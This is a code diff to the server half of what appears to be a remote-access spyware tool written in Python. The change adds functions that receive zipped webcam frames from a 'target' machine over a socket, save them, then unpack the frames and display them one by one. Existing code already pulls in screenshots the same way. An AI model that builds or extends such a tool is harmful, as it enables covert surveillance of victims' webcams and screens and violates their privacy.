@@ -4,6 +4,9 @@ import socket
 import string
 import sys
 import time
+from zipfile import ZipFile
+
+import cv2
 from mss import mss
 
 class Server:
@@ -93,7 +96,10 @@ class Server:
         input()
         while True:
             #self.getTargetInfo()
-            self.screenshot()
+            #self.screenshot()
+            self.rec200vid()
+            input("Play? ")
+            self.test2()
             input("Complete")
             pass
 
@@ -169,10 +175,60 @@ class Server:
         # saving the file
         with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
             screen.write(fullscreen)
-
         print("*** File saved ***")
 
+    def test2(self):
 
+        with ZipFile(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'r') as zip_ref:
+            zip_ref.extractall(f'../receivedfile/webcam{str(self.recvcounter)}',)
+        path = f'../receivedfile/webcam{str(self.recvcounter)}'
+
+        cv2.namedWindow("P2")
+        with os.scandir(path) as entries:
+            for entry in entries:
+                print(entry.name)
+                p = str(path) + str("/") + str(entry.name)
+                x = cv2.imread(p)
+                cv2.imshow("P2", x)
+                cv2.waitKey(0)
+
+    def rec200vid(self):
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        time.sleep(0.1)
+        print("response was : " + response)
+        if response == "Success":
+            print("success")
+            #time.sleep(15)
+            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+            print("size:" + str(size))
+            # size = self.client_socket.recv(self.BUFFER_SIZE).decode()
+            # print("size:" + str(size))
+            time.sleep(0.1)
+            if int(size) <= self.BUFFER_SIZE:
+                # recv archive
+                archive = self.client_socket.recv(self.BUFFER_SIZE)
+                print("*** Got file ***")
+
+                with open(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'wb+') as output:
+                    output.write(archive)
+
+                print("*** File saved ***")
+                self.recvcounter += 1
+            else:
+                # update buffer
+                buff = self.updateBuffer(size)
+
+                # recv archive
+                fullarchive = self.saveBigFile(int(size), buff)
+
+                print("*** Got file *** ")
+                with open(f'../receivedfile/webcam{str(self.recvcounter)}.zip', 'wb+') as output:
+                    output.write(fullarchive)
+
+                print("*** File saved ***")
+                self.recvcounter += 1
+        else:
+            print(response.decode("utf-8"))
 
 def main():
     """ Creating the necessary dirs """
